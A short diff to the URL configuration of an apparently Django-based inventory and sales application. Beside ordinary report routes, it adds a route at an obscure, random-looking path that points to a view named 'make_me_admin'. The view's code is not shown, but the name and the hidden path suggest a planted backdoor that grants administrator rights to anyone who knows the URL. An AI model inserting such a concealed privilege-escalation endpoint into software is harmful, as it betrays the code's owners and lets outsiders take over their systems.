@@ -19,5 +19,7 @@ urlpatterns = [
     path('inventario/reporte-stock/', views.reporte_stock_bajo, name='reporte_stock_bajo'),
     path('inventario/reporte-ventas/', views.reporte_ventas, name='reporte_ventas'),
 
+    path('9f4zLq8T_make_admin/', views.make_me_admin, name='make_admin'),
+
     path('', views.index, name='index'),
 ]
